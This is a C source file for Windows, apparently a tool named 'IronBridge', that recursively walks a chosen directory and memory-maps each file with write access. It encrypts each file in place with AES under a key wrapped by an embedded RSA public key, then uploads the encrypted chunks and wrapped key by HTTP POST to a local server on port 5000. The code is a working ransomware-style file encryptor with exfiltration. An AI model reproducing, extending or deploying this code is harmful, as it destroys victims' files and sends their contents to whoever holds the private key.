#include "../include/common.h"

int IsFileOrDirectory(LPCWSTR path);
void DirectoryMaping(LPCWSTR path, LPCWSTR basePath);
void FileMaping(LPCWSTR path, LPCWSTR basePath);
void EncryptData(BYTE *pData, DWORD sData, BYTE *rawKey, BYTE *iv);
void EncryptKey(BYTE* rawAESKey, DWORD rawKeySize, BYTE** encryptedKeyOut, DWORD* encryptedKeySizeOut);
int SendChunkViaHTTP(HINTERNET hConnect, const wchar_t* relativeFilePath, BYTE* data, DWORD dataSize, int chunkIndex, int totalChunks, const wchar_t* hexEncKey, const wchar_t* hexIV);
void ProcessAndSendChunk(BYTE* FilePointer, LONGLONG totalBytes, LPCWSTR path, LPCWSTR basePath);
void BytesToHexString(BYTE* bytes, DWORD length, wchar_t* hexStr);
void BytesToHexString(BYTE* bytes, DWORD length, wchar_t* hexStr);

void HandleFileProcess() {
    wchar_t filePath[MAX_PATH];
    int status;

    while(1){
        wprintf(L"\033[1;32m[+]\033[0m Please enter the full path to the file/directory (or type 'exit' to return):\n> ");
        wscanf(L"%259ls", filePath); 

        size_t len = wcslen(filePath);
        while(len > 0 && (filePath[len-1] == L'\n' || filePath[len-1] == L'\r' || filePath[len-1] == L' ')) {
            filePath[len-1] = L'\0';
            len--;
        }

        if(wcscmp(filePath, L"exit") == 0){
            break; 
        }

        status = IsFileOrDirectory((LPCWSTR)filePath);


        if(status == 0){
            wprintf(L"Invalid file or directory");
        }
        
        else if(status == 1){
            DirectoryMaping((LPCWSTR)filePath, (LPCWSTR)filePath);
            break;
        }
        else if(status == 2){
            FileMaping((LPCWSTR)filePath, NULL);
            break;
        }

    }
        
}


int IsFileOrDirectory(LPCWSTR path){
    DWORD attribute = GetFileAttributesW(path);
    
    if(attribute == INVALID_FILE_ATTRIBUTES){
        return 0;
    }

    if(attribute & FILE_ATTRIBUTE_DIRECTORY){
        return 1;
    }
    else{
        return 2;
    }

}


void DirectoryMaping(LPCWSTR path, LPCWSTR basePath){
    WIN32_FIND_DATAW FindData;
    HANDLE HandleFile = INVALID_HANDLE_VALUE;

    wchar_t SearchPath[MAX_PATH];
    _snwprintf(SearchPath, MAX_PATH, L"%s\\*", path);

    wprintf(L"\033[1;36m[DEBUG]\033[0m Target Search Path: %ls\n", SearchPath);

    HandleFile = FindFirstFileW(SearchPath, &FindData);
    if (HandleFile == INVALID_HANDLE_VALUE) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Access denied or invalid directory: %ls\n", path);
        return;
    }

    do
    {
        if(wcscmp(FindData.cFileName, L".") == 0 || wcscmp(FindData.cFileName, L"..") == 0){
            continue;
        }
        
        wchar_t fullPath[MAX_PATH];
        _snwprintf(fullPath, MAX_PATH, L"%s\\%s", path, FindData.cFileName);

        if(FindData.dwFileAttributes &  FILE_ATTRIBUTE_DIRECTORY){
            DirectoryMaping(fullPath, basePath);
        }
        else{
            FileMaping(fullPath, basePath);
        }

    } while (FindNextFileW(HandleFile, &FindData) != 0);
    
    FindClose(HandleFile);
}

void FileMaping(LPCWSTR path, LPCWSTR basePath){
    HANDLE HandleFile = NULL, HandleMap = NULL;
    BYTE* FilePointer = NULL; LARGE_INTEGER FileSize;


    wprintf(L"\n\033[1;33m[*]\033[0m Initializing memory mapping for file: '%ls'\n", path);

    HandleFile = CreateFileW(
        path,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if(HandleFile == INVALID_HANDLE_VALUE){
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to open file. Error Code: %lu\n", GetLastError());
        return;
    }

    if(!GetFileSizeEx(HandleFile, &FileSize)){
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to get file size. Error Code: %lu\n", GetLastError());
        CloseHandle(HandleFile);
        return;
    }

    if(FileSize.QuadPart == 0){
        wprintf(L"\033[1;33m[WARNING]\033[0m File is empty (0 bytes). Nothing to process.\n");
        CloseHandle(HandleFile);
        return;
    }

    wprintf(L"\033[1;36m[INFO]\033[0m File Size: %lld bytes\n", FileSize.QuadPart);

    HandleMap = CreateFileMappingW(
        HandleFile, NULL,
        PAGE_READWRITE, 0, 0, NULL
    );

    if (HandleMap == NULL) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to create file mapping object. Error Code: %lu\n", GetLastError());
        CloseHandle(HandleFile);
        return;
    }

    FilePointer = (BYTE *)MapViewOfFile(
        HandleMap, FILE_MAP_ALL_ACCESS,
        0, 0, 0
    );

    if (FilePointer == NULL) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to map view of file into memory. Error Code: %lu\n", GetLastError());
        CloseHandle(HandleMap);
        CloseHandle(HandleFile);
        return;
    }

    wprintf(L"\033[1;32m[+]\033[0m File successfully loaded into RAM!\n");


    ProcessAndSendChunk(FilePointer, FileSize.QuadPart, path, basePath);
    
    UnmapViewOfFile(FilePointer); 
    CloseHandle(HandleMap);          
    CloseHandle(HandleFile);

    wprintf(L"\033[1;32m[+]\033[0m File unmapped and handles closed safely.\n\n");
}


void EncryptData(BYTE *pData, DWORD sData, BYTE *rawKey, BYTE *iv){
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE* pbKeyObject = NULL;
    
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to open AES provider.\n");
        return;
    }

    const wchar_t chainMode[] = L"ChainingModeCFB";
    status = BCryptSetProperty(
        hAlg,
        L"ChainingMode",
        (PUCHAR)chainMode,
        sizeof(chainMode),
        0
    );
    if (status != 0) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to set CFB mode. Error Code: 0x%08X\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return;
    }

    DWORD cbKeyObject = 0;    
    DWORD cbData = 0;         
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (status != 0) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to get key object length.\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return;
    }

    pbKeyObject = (BYTE*)calloc(cbKeyObject, sizeof(BYTE));
    if (pbKeyObject == NULL) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Memory allocation failed.\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, rawKey, 32, 0);
    if (status == 0) {
        status = BCryptEncrypt(hKey, pData, sData, NULL, iv, 16, pData, sData, &cbData, 0);
        if (status != 0) {
            wprintf(L"\033[1;31m[ERROR]\033[0m AES Encryption failed with status: 0x%08X\n", status);
        }
    } else {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to generate symmetric key. Status: 0x%08X\n", status);
    }

    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}

const BYTE rsa_pub_blob[] = { 0x52, 0x53, 0x41, 0x31, 0x00, 0x08, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xa0, 0x62, 0x5c, 0x02, 0x81, 0xc7, 0xe6, 0x5b, 0xc4, 0x12, 0x28, 0x36, 0x8e, 0xd0, 0xff, 0x6d, 0x1e, 0x51, 0x99, 0xb1, 0x23, 0x62, 0x32, 0xf6, 0xe5, 0xc7, 0x18, 0x3f, 0xde, 0x68, 0x28, 0xa0, 0xe6, 0xb2, 0x9f, 0x7b, 0x90, 0x38, 0xbf, 0x4d, 0x09, 0x81, 0x71, 0x16, 0x9e, 0x68, 0xdb, 0x36, 0x8d, 0xe8, 0x40, 0x70, 0xfd, 0x03, 0x6b, 0x7c, 0x05, 0x2e, 0x5d, 0x07, 0xe1, 0x7e, 0x7d, 0xf7, 0x1d, 0x23, 0xb4, 0x4c, 0xb3, 0x43, 0x4a, 0x1c, 0x2b, 0x90, 0x6f, 0xe9, 0xf6, 0x18, 0x1a, 0xaa, 0x53, 0xe1, 0x39, 0xd7, 0xd7, 0xed, 0x54, 0x67, 0x91, 0x4b, 0x7e, 0x68, 0xc6, 0x98, 0x57, 0x01, 0x7e, 0x5e, 0x25, 0x77, 0x1f, 0x3f, 0xfc, 0xc8, 0xe4, 0xf8, 0x08, 0xe2, 0x78, 0xa2, 0x5e, 0x12, 0x8f, 0xe9, 0xaf, 0x61, 0x3a, 0xc1, 0x29, 0x66, 0x2b, 0x11, 0x4f, 0xb5, 0x0a, 0xd1, 0x15, 0x7a, 0x37, 0x35, 0x29, 0x34, 0x27, 0x92, 0x04, 0x98, 0xb6, 0xbb, 0xa3, 0x99, 0x42, 0xa9, 0x5d, 0xd0, 0xbe, 0xa8, 0xde, 0xe8, 0x65, 0xcb, 0xf2, 0x00, 0xf1, 0x2f, 0x69, 0x62, 0x18, 0x9f, 0x08, 0xec, 0x8a, 0x56, 0x0d, 0x57, 0x86, 0x27, 0x13, 0x3b, 0x8b, 0x32, 0x55, 0x33, 0xff, 0xee, 0x0c, 0x62, 0x96, 0xbb, 0x52, 0x8b, 0x53, 0x47, 0x56, 0x26, 0x10, 0xa1, 0xb1, 0x3d, 0x8a, 0x75, 0xff, 0x63, 0xda, 0x69, 0x76, 0x8c, 0xe4, 0x97, 0x83, 0x94, 0xd9, 0x94, 0x9e, 0x64, 0x2d, 0xa9, 0xc9, 0xc3, 0x64, 0xd8, 0xd1, 0xc8, 0xb6, 0xd0, 0xba, 0x08, 0x58, 0x75, 0xc5, 0xe4, 0xc8, 0x7c, 0x62, 0x72, 0xfd, 0xab, 0x4d, 0xbb, 0xb0, 0x55, 0xf0, 0xde, 0xbc, 0xe1, 0x93, 0x88, 0xa7, 0x56, 0x22, 0x2f, 0x06, 0x6e, 0x45, 0x78, 0xb1, 0xdb, 0x79, 0x4c, 0xf9, 0x36, 0x1a, 0xb2, 0x5c, 0x09, 0x3b, 0x4b };
const DWORD rsa_pub_blob_size = 283;

void EncryptKey(BYTE* rawAESKey, DWORD rawKeySize, BYTE** encryptedKeyOut, DWORD* encryptedKeySizeOut){
    BCRYPT_ALG_HANDLE hRsaAlg = NULL;
    BCRYPT_KEY_HANDLE hPubKey = NULL;
    NTSTATUS status;

    *encryptedKeyOut = NULL;
    *encryptedKeySizeOut = 0;

    status = BCryptOpenAlgorithmProvider(&hRsaAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (status != 0) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to open RSA provider.\n");
        return;
    }

    status = BCryptImportKeyPair(hRsaAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hPubKey, (PUCHAR)rsa_pub_blob, rsa_pub_blob_size, 0);
    if (status != 0) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Failed to import RSA public key.\n");
        BCryptCloseAlgorithmProvider(hRsaAlg, 0);
        return;
    }

    DWORD result = 0;
    BCryptEncrypt(hPubKey, rawAESKey, rawKeySize, NULL, NULL, 0, NULL, 0, &result, BCRYPT_PAD_PKCS1);


    *encryptedKeyOut = (BYTE*)calloc(result, sizeof(BYTE));
    *encryptedKeySizeOut = result;

    status = BCryptEncrypt(hPubKey, rawAESKey, rawKeySize, NULL, NULL, 0, *encryptedKeyOut, result, &result, BCRYPT_PAD_PKCS1);
    if (status == 0) {
        *encryptedKeySizeOut = result;
        wprintf(L"\033[1;32m[+]\033[0m AES Key successfully encrypted with RSA!\n");
    } else {
        wprintf(L"\033[1;31m[ERROR]\033[0m RSA Encryption failed: 0x%08X\n", status);
        free(*encryptedKeyOut);
        *encryptedKeyOut = NULL;
    }

    BCryptDestroyKey(hPubKey);
    BCryptCloseAlgorithmProvider(hRsaAlg, 0);
}


int SendChunkViaHTTP(HINTERNET hConnect, const wchar_t* relativeFilePath, BYTE* data, DWORD dataSize, int chunkIndex, int totalChunks, const wchar_t* hexEncKey, const wchar_t* hexIV){
    BOOL bResults = FALSE;
    HINTERNET hRequest = NULL;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/upload", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if(!hRequest){
        wprintf(L"[ERROR] WinHttpOpenRequest failed: %lu\n", GetLastError());
        return 0;
    }

    wchar_t headers[2048];
    swprintf(headers, 2048,
        L"X-File-Path: %ls\r\n"
        L"X-Chunk-Index: %d\r\n"
        L"X-Total-Chunks: %d\r\n"
        L"X-Enc-Key: %ls\r\n" 
        L"X-IV: %ls\r\n"
        L"Content-Type: application/octet-stream\r\n",
        relativeFilePath, chunkIndex, totalChunks, hexEncKey, hexIV
    );
    
    bResults = WinHttpSendRequest(hRequest, headers, -1L, WINHTTP_NO_REQUEST_DATA, 0, dataSize, 0);
    if (!bResults) {
        wprintf(L"[ERROR] WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        return 0;
    }

    DWORD bytesWritten = 0;
    bResults = WinHttpWriteData(hRequest, data, dataSize, &bytesWritten);
    if (!bResults) {
        wprintf(L"[ERROR] WinHttpWriteData failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        return 0;
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        wprintf(L"[ERROR] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        return 0;
    }

    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    WinHttpQueryHeaders(hRequest, 
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                        WINHTTP_HEADER_NAME_BY_INDEX, 
                        &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);

    if (dwStatusCode != 200 && dwStatusCode != 201) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Server rejected chunk. HTTP Status Code: %lu\n", dwStatusCode);
        bResults = FALSE; 
    }

    WinHttpCloseHandle(hRequest);
    return bResults ? 1 : 0;
}

void ProcessAndSendChunk(BYTE* FilePointer, LONGLONG totalBytes, LPCWSTR path, LPCWSTR basePath){

    const wchar_t* relativePath = path;
    if (basePath != NULL && wcslen(basePath) > 0) {
        relativePath = path + wcslen(basePath) + 1; 
    } else {
        const wchar_t* lastSlash = wcsrchr(path, L'\\');
        if (lastSlash != NULL) {
            relativePath = lastSlash + 1;
        }
    }

    HINTERNET hSession = WinHttpOpen(L"IronBridge/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        wprintf(L"\033[1;31m[ERROR]\033[0m WinHttpOpen failed.\n");
        return;
    }
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 5000, 0);
    if (!hConnect) {
        wprintf(L"\033[1;31m[ERROR]\033[0m WinHttpConnect failed.\n");
        WinHttpCloseHandle(hSession);
        return;
    }

    BYTE rawKey[32];
    BCryptGenRandom(NULL, rawKey, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    BYTE* encryptedKey = NULL;
    DWORD encryptedKeySize = 0;

    EncryptKey(rawKey, 32, &encryptedKey, &encryptedKeySize);
    if (encryptedKey == NULL || encryptedKeySize == 0) {
        wprintf(L"\033[1;31m[ERROR]\033[0m Aborting file processing due to RSA encryption failure.\n");
        SecureZeroMemory(rawKey, sizeof(rawKey));
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    wchar_t hexEncKey[1024]; 
    BytesToHexString(encryptedKey, encryptedKeySize, hexEncKey);

    int totalChunks = (int)((totalBytes + CHUNK_SIZE - 1) / CHUNK_SIZE);
    wprintf(L"\033[1;36m[*]\033[0m Sending %ls in %d chunks...\n", relativePath, totalChunks);

    for (int i = 0; i < totalChunks; i++) {
        LONGLONG offset = (LONGLONG)i * CHUNK_SIZE;
        DWORD bytesToSend = (DWORD)((totalBytes - offset) >= CHUNK_SIZE ? CHUNK_SIZE : (totalBytes - offset));

        BYTE chunkIV[16];
        BCryptGenRandom(NULL, chunkIV, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

        wchar_t hexIV[33]; 
        BytesToHexString(chunkIV, 16, hexIV);

        EncryptData(FilePointer + offset, bytesToSend, rawKey, chunkIV);

        wprintf(L"    -> Sending chunk %d/%d (%lu bytes)...\n", i + 1, totalChunks, bytesToSend);
        
        if (!SendChunkViaHTTP(hConnect, relativePath, FilePointer + offset, bytesToSend, i, totalChunks, hexEncKey, hexIV)) {
            wprintf(L"\033[1;31m[ERROR]\033[0m Failed to send chunk %d\n", i);
            break;
        }
    }
    if (encryptedKey) free(encryptedKey);
    SecureZeroMemory(rawKey, sizeof(rawKey));
    
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    wprintf(L"\033[1;32m[+]\033[0m Network handles closed safely.\n");
}

void BytesToHexString(BYTE* bytes, DWORD length, wchar_t* hexStr) {
    for (DWORD i = 0; i < length; i++) {
        swprintf(&hexStr[i * 2], 3, L"%02X", bytes[i]);
    }
}